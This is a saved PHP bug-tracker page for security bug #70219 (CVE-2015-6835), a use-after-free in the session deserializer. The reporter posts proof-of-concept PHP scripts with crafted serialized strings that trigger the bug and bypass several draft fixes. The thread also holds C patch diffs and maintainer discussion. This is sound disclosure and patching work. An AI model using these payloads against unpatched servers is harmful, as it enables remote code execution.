@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #70219 - RDF' href='rss/bug.php?id=70219'>
+        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #70219 - RSS 2.0' href='rss/bug.php?id=70219&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #70219 :: Use after free vulnerability in session deserializer</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=70219">Sec Bug</a>&nbsp;#70219</th>
+            <td id="summary" colspan="5">Use after free vulnerability in session deserializer</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2015-08-09 10:30 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2015-09-09 10:08 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=%2AGeneral+Issues">*General Issues</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>5.4.44</td>
+            <th class="details">OS:</th>
+            <td>*</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6835" target="_blank">2015-6835</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=70219&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=70219&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=70219&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1439116204">&nbsp;</a><strong>[2015-08-09 10:30 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Description:
+------------
+I have reported a number of similar vulnerabilities in unserialize().
+
+```
+PS_SERIALIZER_DECODE_FUNC(php) /* {{{ */
+{
+
+	...	
+
+	PHP_VAR_UNSERIALIZE_INIT(var_hash);
+
+	p = val;
+
+	while (p &lt; endptr) {
+		
+		...
+
+		if (has_value) {
+			ALLOC_INIT_ZVAL(current);
+			if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;q, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) {
+				php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
+			}
+			zval_ptr_dtor(&amp;current);
+		}
+		PS_ADD_VARL(name, namelen);
+skip:
+		efree(name);
+
+		p = q;
+	}
+break_outer_loop:
+
+	PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+
+	return SUCCESS;
+}
+
+when sesson deserializer (php/php_binary) deserializing multiple data it will calls php_var_unserialize() multiple times. so we can create ZVAL and free it via the php_var_unserialize() with a crafted serialized string, then the next  call php_var_unserialize() will still allow to use R: or r: to set references to that already freed memory. it is possible to use-after-free attack and execute arbitrary code remotely.
+
+PoC:
+
+```
+session_start();
+
+$exploit = 'ryat|a:2:{i:0;i:1;i:1;a:1:{i:1;chtg|a:1:{i:0;R:4;}';
+session_decode($exploit);
+
+for ($i = 0; $i &lt; 5; $i++) {
+    $v[$i] = 'hi'.$i;
+}
+
+var_dump($_SESSION);
+```
+
+in addition, in some other cases it may also lead to security issue, ex: i) a crafted Serializable::unserialize() ii) via unserialize()'s callback function and zend_lookup_class() call a crafted __autoload(). i have reported the similar ideas to other bug report, so i will not describe them again.
+
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=70219'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=70219'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_comment' ><a name="1439123199">&nbsp;</a><strong>[2015-08-09 12:26 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>the patch for 5.4 series (maybe work on 5.5 and 5.6 series):
+
+diff --git a/php-5.4.44/session.c b/php-5.4.44-fixed/session.c
+index 306aba3..7081229 100644
+--- a/php-5.4.44/session.c
++++ b/php-5.4.44-fixed/session.c
+@@ -854,7 +854,16 @@ PS_SERIALIZER_DECODE_FUNC(php_binary) /* {{{ */
+ 		if (has_value) {
+ 			ALLOC_INIT_ZVAL(current);
+ 			if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;p, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) {
++				var_push_dtor(&amp;var_hash, &amp;current);
+ 				php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
++			} else {
++				if (!EG(exception) &amp;&amp; BG(unserialize).level != 1) {
++					zend_throw_exception_ex(NULL, 0 TSRMLS_CC, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)p - val), (long)((char*)endptr - val));
++					PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
++					return SUCCESS;
++				}
++				PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
++				PHP_VAR_UNSERIALIZE_INIT(var_hash);
+ 			}
+ 			zval_ptr_dtor(&amp;current);
+ 		}
+@@ -946,7 +955,16 @@ PS_SERIALIZER_DECODE_FUNC(php) /* {{{ */
+ 		if (has_value) {
+ 			ALLOC_INIT_ZVAL(current);
+ 			if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;q, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) {
++				var_push_dtor(&amp;var_hash, &amp;current);
+ 				php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
++			} else {
++				if (!EG(exception) &amp;&amp; BG(unserialize).level != 1) {
++					zval_ptr_dtor(&amp;current);
++					zend_throw_exception_ex(NULL, 0 TSRMLS_CC, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)q - p), (long)((char*)endptr - p));
++					goto break_outer_loop;
++				}
++				PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
++				PHP_VAR_UNSERIALIZE_INIT(var_hash);
+ 			}
+ 			zval_ptr_dtor(&amp;current);
+ 		}
+</pre>
+</div><div class='comment type_comment' ><a name="1439294873">&nbsp;</a><strong>[2015-08-11 12:07 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>update a new patch for 5.4 serise:
+
+diff --git a/php-5.4.44/session.c b/php-5.4.44-fixed/session.c
+index 306aba3..f0d484a 100644
+--- a/php-5.4.44/session.c
++++ b/php-5.4.44-fixed/session.c
+@@ -854,7 +854,17 @@ PS_SERIALIZER_DECODE_FUNC(php_binary) /* {{{ */
+ 		if (has_value) {
+ 			ALLOC_INIT_ZVAL(current);
+ 			if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;p, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) {
++				var_push_dtor(&amp;var_hash, &amp;current);
+ 				php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
++			} else {
++				if (!EG(exception) &amp;&amp; BG(unserialize).level != 1) {
++					zval_ptr_dtor(&amp;current);
++					zend_throw_exception_ex(NULL, 0 TSRMLS_CC, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)p - val), vallen);
++					PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
++					return SUCCESS;
++				}
++				PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
++				PHP_VAR_UNSERIALIZE_INIT(var_hash);
+ 			}
+ 			zval_ptr_dtor(&amp;current);
+ 		}
+@@ -946,7 +956,16 @@ PS_SERIALIZER_DECODE_FUNC(php) /* {{{ */
+ 		if (has_value) {
+ 			ALLOC_INIT_ZVAL(current);
+ 			if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;q, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) {
++				var_push_dtor(&amp;var_hash, &amp;current);
+ 				php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
++			} else {
++				if (!EG(exception) &amp;&amp; BG(unserialize).level != 1) {
++					zval_ptr_dtor(&amp;current);
++					zend_throw_exception_ex(NULL, 0 TSRMLS_CC, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)q - p), vallen);
++					goto break_outer_loop;
++				}
++				PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
++				PHP_VAR_UNSERIALIZE_INIT(var_hash);
+ 			}
+ 			zval_ptr_dtor(&amp;current);
+ 		}
+</pre>
+</div><div class='comment type_comment' ><a name="1439294979">&nbsp;</a><strong>[2015-08-11 12:09 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>post a patch for 5.5 and 5.6 series (fix another UaF in php_serialize):
+
+diff --git a/php-5.6.12/session.c b/php-5.6.12-fixed/session.c
+index b73d5ed..c47aaab 100644
+--- a/php-5.6.12/session.c
++++ b/php-5.6.12-fixed/session.c
+@@ -857,12 +857,25 @@ PS_SERIALIZER_ENCODE_FUNC(php_serialize) /* {{{ */
+ PS_SERIALIZER_DECODE_FUNC(php_serialize) /* {{{ */
+ {
+ 	const char *endptr = val + vallen;
++	const char *p;
+ 	zval *session_vars;
+ 	php_unserialize_data_t var_hash;
+ 
+ 	PHP_VAR_UNSERIALIZE_INIT(var_hash);
+ 	ALLOC_INIT_ZVAL(session_vars);
+-	php_var_unserialize(&amp;session_vars, &amp;val, endptr, &amp;var_hash TSRMLS_CC);
++	p = val;
++	if (php_var_unserialize(&amp;session_vars, &amp;val, endptr, &amp;var_hash TSRMLS_CC)) {
++		if (BG(unserialize).level != 1) {
++			var_push_dtor(&amp;var_hash, &amp;session_vars);
++		}
++	} else {
++		if (!EG(exception) &amp;&amp; BG(unserialize).level != 1 &amp;&amp; vallen != 0) {
++			zval_ptr_dtor(&amp;session_vars);
++			zend_throw_exception_ex(NULL, 0 TSRMLS_CC, &quot;Error at offset %d of %d bytes&quot;, (long)((char*)val - p), vallen);
++			PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
++			return SUCCESS;
++		}
++	}
+ 	PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+ 	if (PS(http_session_vars)) {
+ 		zval_ptr_dtor(&amp;PS(http_session_vars));
+@@ -946,7 +959,17 @@ PS_SERIALIZER_DECODE_FUNC(php_binary) /* {{{ */
+ 		if (has_value) {
+ 			ALLOC_INIT_ZVAL(current);
+ 			if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;p, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) {
++				var_push_dtor(&amp;var_hash, &amp;current);
+ 				php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
++			} else {
++				if (!EG(exception) &amp;&amp; BG(unserialize).level != 1) {
++					zval_ptr_dtor(&amp;current);
++					zend_throw_exception_ex(NULL, 0 TSRMLS_CC, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)p - val), vallen);
++					PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
++					return SUCCESS;
++				}
++				PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
++				PHP_VAR_UNSERIALIZE_INIT(var_hash);
+ 			}
+ 			zval_ptr_dtor(&amp;current);
+ 		}
+@@ -1038,7 +1061,16 @@ PS_SERIALIZER_DECODE_FUNC(php) /* {{{ */
+ 		if (has_value) {
+ 			ALLOC_INIT_ZVAL(current);
+ 			if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;q, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) {
++				var_push_dtor(&amp;var_hash, &amp;current);
+ 				php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
++			} else {
++				if (!EG(exception) &amp;&amp; BG(unserialize).level != 1) {
++					zval_ptr_dtor(&amp;current);
++					zend_throw_exception_ex(NULL, 0 TSRMLS_CC, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)q - p), vallen);
++					goto break_outer_loop;
++				}
++				PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
++				PHP_VAR_UNSERIALIZE_INIT(var_hash);
+ 			}
+ 			zval_ptr_dtor(&amp;current);
+ 		}
+</pre>
+</div><div class='comment type_comment' ><a name="1439374012">&nbsp;</a><strong>[2015-08-12 10:06 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>i think that if the previous deserialized session data is invalid, should not continue to follow deserialized because it may produce unexpected session data. so i update a new patch for this bug.
+
+diff --git a/php-5.6.12/session.c b/php-5.6.12-fixed/session.c
+index b73d5ed..34a6ef2 100644
+--- a/php-5.6.12/session.c
++++ b/php-5.6.12-fixed/session.c
+@@ -857,12 +857,18 @@ PS_SERIALIZER_ENCODE_FUNC(php_serialize) /* {{{ */
+ PS_SERIALIZER_DECODE_FUNC(php_serialize) /* {{{ */
+ {
+ 	const char *endptr = val + vallen;
++	const char *p;
+ 	zval *session_vars;
+ 	php_unserialize_data_t var_hash;
+ 
+ 	PHP_VAR_UNSERIALIZE_INIT(var_hash);
+ 	ALLOC_INIT_ZVAL(session_vars);
+-	php_var_unserialize(&amp;session_vars, &amp;val, endptr, &amp;var_hash TSRMLS_CC);
++	p = val;
++	if (php_var_unserialize(&amp;session_vars, &amp;val, endptr, &amp;var_hash TSRMLS_CC) &amp;&amp; BG(unserialize).level != 1) {
++		var_push_dtor(&amp;var_hash, &amp;session_vars);
++	} else if (!EG(exception) &amp;&amp; BG(unserialize).level != 1 &amp;&amp; vallen != 0) {
++		zend_throw_exception_ex(NULL, 0 TSRMLS_CC, &quot;Error at offset %d of %d bytes&quot;, (long)((char*)val - p), vallen);
++	}
+ 	PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+ 	if (PS(http_session_vars)) {
+ 		zval_ptr_dtor(&amp;PS(http_session_vars));
+@@ -946,7 +952,13 @@ PS_SERIALIZER_DECODE_FUNC(php_binary) /* {{{ */
+ 		if (has_value) {
+ 			ALLOC_INIT_ZVAL(current);
+ 			if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;p, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) {
++				var_push_dtor(&amp;var_hash, &amp;current);
+ 				php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
++			} else {
++				if (!EG(exception) &amp;&amp; BG(unserialize).level != 1) {
++					zend_throw_exception_ex(NULL, 0 TSRMLS_CC, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)p - val), vallen);
++				}
++				endptr = p;
+ 			}
+ 			zval_ptr_dtor(&amp;current);
+ 		}
+@@ -1038,7 +1050,13 @@ PS_SERIALIZER_DECODE_FUNC(php) /* {{{ */
+ 		if (has_value) {
+ 			ALLOC_INIT_ZVAL(current);
+ 			if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;q, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) {
++				var_push_dtor(&amp;var_hash, &amp;current);
+ 				php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
++			} else {
++				if (!EG(exception) &amp;&amp; BG(unserialize).level != 1) {
++					zend_throw_exception_ex(NULL, 0 TSRMLS_CC, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)q - p), vallen);
++				}
++				endptr = p;
+ 			}
+ 			zval_ptr_dtor(&amp;current);
+ 		}
+</pre>
+</div><div class='comment type_comment' ><a name="1439770701">&nbsp;</a><strong>[2015-08-17 00:18 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Unfortunately, this patch can not be applied to 5.x since in 5.x core functions can not throw exceptions.
+</pre>
+</div><div class='comment type_comment' ><a name="1439771417">&nbsp;</a><strong>[2015-08-17 00:30 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>maybe you can use fatal error level messsage replacement throw exceptions
+</pre>
+</div><div class='comment type_comment' ><a name="1439773630">&nbsp;</a><strong>[2015-08-17 01:07 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Also I understand that this requires control over the session content, which for most applications would mean the security is already overridden, as session usually contains all security data. So not sure if this qualifies as security issue... 
+
+Also, if the session data is broken, it'd probably be better to just bail out and not try to decode the rest of it. 
+
+Proposed patch: <a href="https://gist.github.com/smalyshev/272028a9e8be40530d0c" rel="nofollow">https://gist.github.com/smalyshev/272028a9e8be40530d0c</a>
+
+Please see if it fixes the problem for you.
+</pre>
+</div><div class='comment type_comment' ><a name="1439774505">&nbsp;</a><strong>[2015-08-17 01:21 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>I do not have a test environment now, but only from the code look, this patch will break `make test`, and can be bypass via crafted Serializable::unserialize().
+</pre>
+</div><div class='comment type_comment' ><a name="1439792851">&nbsp;</a><strong>[2015-08-17 06:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Could you please explain in more detail (preferably with examples) what you mean?
+</pre>
+</div><div class='comment type_comment' ><a name="1439794197">&nbsp;</a><strong>[2015-08-17 06:49 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>i)this patch looks break ext/session/tests/session_decode_error2.phpt.
+ii)you have to consider the situation in BG(unserialize).level != 1, like bug#70172 and bug#70213, ex:
+```
+class obj implements Serializable {
+    var $data;
+    function serialize() {
+        return serialize($this-&gt;data);
+    }
+    function unserialize($data) {
+        session_start();
+        session_decode($data);
+    }
+}
+```
+iii)you also may need to consider the code:
+```
+zval_ptr_dtor(&amp;current);
+```
+</pre>
+</div><div class='comment type_comment' ><a name="1439797795">&nbsp;</a><strong>[2015-08-17 07:49 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>so i post new PoC for iii), and it can bypass your patch.
+
+```
+session_start();
+
+$exploit = 'ryat|a:2:{i:0;i:1;i:1;i:2;}ryat|i:1;chtg|a:1:{i:0;R:2;}';
+session_decode($exploit);
+
+for ($i = 0; $i &lt; 5; $i++) {
+    $v[$i] = 'hi'.$i;
+}
+
+var_dump($_SESSION);
+```
+</pre>
+</div><div class='comment type_comment' ><a name="1439798801">&nbsp;</a><strong>[2015-08-17 08:06 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>if you can use fatal error level messsage replacement throw exceptions, so you can consider using the my patch, it can solve all these problems.
+</pre>
+</div><div class='comment type_comment' ><a name="1439802170">&nbsp;</a><strong>[2015-08-17 09:02 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>oh, previous PoC is not work, and i update a new PoC:
+
+```
+session_start();
+
+$exploit = 'ryat|a:1:{i:0;i:1;}ryat|i:1;chtg|R:1;';
+session_decode($exploit);
+
+for ($i = 0; $i &lt; 5; $i++) {
+    $v[$i] = 'hi'.$i;
+}
+
+var_dump($_SESSION);
+```
+</pre>
+</div><div class='comment type_comment' ><a name="1440361383">&nbsp;</a><strong>[2015-08-23 20:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Revised patch: <a href="https://gist.github.com/smalyshev/272028a9e8be40530d0c" rel="nofollow">https://gist.github.com/smalyshev/272028a9e8be40530d0c</a>
+
+(yes I know it can break some tests, I'll deal with them)
+
+I am not sure returning fatal errors is a good idea as fatal errors are, well, fatal and introducing more of them has very broad BC implications and may break some apps in various ways and we don't want that in stable versions. I agree that sessions code seems to be way more permissive that it should be, but I think we may try to fix it without introducing new BC breaks.
+</pre>
+</div><div class='comment type_comment' ><a name="1440369732">&nbsp;</a><strong>[2015-08-23 22:42 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>this patch can be bypass:
+```
+class obj implements Serializable {
+    var $data;
+    function serialize() {
+        return serialize($this-&gt;data);
+    }
+    function unserialize($data) {
+        session_start();
+        session_decode($data);
+    }
+}
+
+$inner = 'ryat|a:1:{i:0;a:1:{i:1;a:0:{';
+$exploit = 'a:2:{i:0;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}i:1;R:5;}';
+
+$data = unserialize($exploit);
+
+for ($i = 0; $i &lt; 5; $i++) {
+    $v[$i] = 'hi'.$i;
+}
+
+var_dump($data);
+```
+so you have to consider the situation in BG(unserialize).level != 1
+</pre>
+</div><div class='comment type_comment' ><a name="1440372269">&nbsp;</a><strong>[2015-08-23 23:24 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>I'm sorry, I can not reproduce any problem with the latest code. Could you explain what is the problem there and what you are seeing? What exactly is the problem you're seeing when BG(unserialize).level != 1?
+</pre>
+</div><div class='comment type_comment' ><a name="1440372802">&nbsp;</a><strong>[2015-08-23 23:33 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>oh, maybe you test the code on 5.4 series (the code worked on 5.5 and 5.6 series), i update new code for 5.4 series:
+
+```
+class obj implements Serializable {
+    var $data;
+    function serialize() {
+        return serialize($this-&gt;data);
+    }
+    function unserialize($data) {
+        session_start();
+        session_decode($data);
+    }
+}
+
+$inner = 'ryat|a:1:{i:0;a:1:{i:1;';
+$exploit = 'a:2:{i:0;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}i:1;R:4;}';
+
+$data = unserialize($exploit);
+
+for ($i = 0; $i &lt; 5; $i++) {
+    $v[$i] = 'hi'.$i;
+}
+
+var_dump($data);
+```
+</pre>
+</div><div class='comment type_comment' ><a name="1440373810">&nbsp;</a><strong>[2015-08-23 23:50 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>OK, I see what's going on there - process_nested_data frees values even though there can be references for them. I've updated <a href="https://gist.github.com/smalyshev/272028a9e8be40530d0c" rel="nofollow">https://gist.github.com/smalyshev/272028a9e8be40530d0c</a> to account for that issue.
+</pre>
+</div><div class='comment type_comment' ><a name="1440376806">&nbsp;</a><strong>[2015-08-24 00:40 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>the latest patch looks and test is ok.
+</pre>
+</div><div class='comment type_comment' ><a name="1440386999">&nbsp;</a><strong>[2015-08-24 03:29 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>oh, you need to also fix session's php_serialize deserializer in 5.5 and 5.6 series.
+</pre>
+</div><div class='comment type_comment' ><a name="1440387209">&nbsp;</a><strong>[2015-08-24 03:33 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>These will be merged closer to the release.
+</pre>
+</div><div class='comment type_comment' ><a name="1440387711">&nbsp;</a><strong>[2015-08-24 03:41 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>in 5.5 and 5.6 series, another UaF exist in session's php_serialize deserializer:
+```
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+
+class obj implements Serializable {
+    var $data;
+    function serialize() {
+        return serialize($this-&gt;data);
+    }
+    function unserialize($data) {
+        session_decode($data);
+    }
+}
+
+
+$inner = 'r:2;';
+$exploit = 'a:2:{i:0;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}i:1;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}}';
+// $exploit = 'a:1:{i:0;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}';
+
+$data = unserialize($exploit);
+
+for ($i = 0; $i &lt; 5; $i++) {
+    $v[$i] = 'hi'.$i;
+}
+
+var_dump($data);
+var_dump($_SESSION);
+```
+</pre>
+</div><div class='comment type_comment' ><a name="1440427634">&nbsp;</a><strong>[2015-08-24 14:47 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>the patch can fix another UaF in session's php_serialize deserializer. (5.5 and 5.6 series)
+
+diff --git a/php-5.6.12/session.c b/php-5.6.12-fixed/session.c
+index b73d5ed..c4f8b72 100644
+--- a/php-5.6.12/session.c
++++ b/php-5.6.12-fixed/session.c
+@@ -862,7 +862,9 @@ PS_SERIALIZER_DECODE_FUNC(php_serialize) /* {{{ */
+ 
+ 	PHP_VAR_UNSERIALIZE_INIT(var_hash);
+ 	ALLOC_INIT_ZVAL(session_vars);
+-	php_var_unserialize(&amp;session_vars, &amp;val, endptr, &amp;var_hash TSRMLS_CC);
++	if (php_var_unserialize(&amp;session_vars, &amp;val, endptr, &amp;var_hash TSRMLS_CC)) {
++		var_push_dtor(&amp;var_hash, &amp;session_vars);
++	}	
+ 	PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+ 	if (PS(http_session_vars)) {
+ 		zval_ptr_dtor(&amp;PS(http_session_vars));
+@@ -871,7 +873,8 @@ PS_SERIALIZER_DECODE_FUNC(php_serialize) /* {{{ */
+ 		array_init(session_vars);
+ 	}
+ 	PS(http_session_vars) = session_vars;
+-	ZEND_SET_GLOBAL_VAR_WITH_LENGTH(&quot;_SESSION&quot;, sizeof(&quot;_SESSION&quot;), PS(http_session_vars), 2, 1);
++	Z_ADDREF_PP(&amp;PS(http_session_vars));
++	zend_hash_update(&amp;EG(symbol_table), &quot;_SESSION&quot;, sizeof(&quot;_SESSION&quot;), &amp;PS(http_session_vars), sizeof(zval *), NULL);
+ 	return SUCCESS;
+ }
+ /* }}} */
+</pre>
+</div><div class='comment type_comment' ><a name="1440509643">&nbsp;</a><strong>[2015-08-25 13:34 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>hi, your latest patch can lead to null pointer dereference issue:
+
+```
+		if (!php_var_unserialize(&amp;key, p, max, NULL TSRMLS_CC)) {  &lt;&lt;&lt;&lt;&lt;  var_hash is NULL
+                        var_push_dtor_no_addref(var_hash, &amp;key);
+ 			return 0;
+ 		}
+```
+PoC:
+```
+unserialize('a:1:{O:3:&quot;obj&quot;:1:{s:4:&quot;ryat&quot;;');
+```
+You need to fix it in var_push_dtor_no_addref, ex:
+```
+PHPAPI void var_push_dtor_no_addref(php_unserialize_data_t *var_hashx, zval **rval)
+{
+	var_entries *var_hash;
+	
+	if (!var_hashx || !*var_hashx) {
+		return;
+	}
+	
+	var_hash = (*var_hashx)-&gt;last_dtor;
+```
+</pre>
+</div><div class='comment type_comment' ><a name="1440576466">&nbsp;</a><strong>[2015-08-26 08:07 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>I've seen the null pointer issue, this will be fixed. However, the proposed patch for 5.5 seems to change the semantics, so I don't think it would work. I'll look into what's going on there.
+</pre>
+</div><div class='comment type_comment' ><a name="1440696730">&nbsp;</a><strong>[2015-08-27 17:32 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>oh, the latest patch work for 5.5 and 5.6:
+
+diff --git a/php-5.6.12/session.c b/php-5.6.12-fixed/session.c
+index b73d5ed..c4f8b72 100644
+--- a/php-5.6.12/session.c
++++ b/php-5.6.12-fixed/session.c
+@@ -862,7 +862,9 @@ PS_SERIALIZER_DECODE_FUNC(php_serialize) /* {{{ */
+ 
+ 	PHP_VAR_UNSERIALIZE_INIT(var_hash);
+ 	ALLOC_INIT_ZVAL(session_vars);
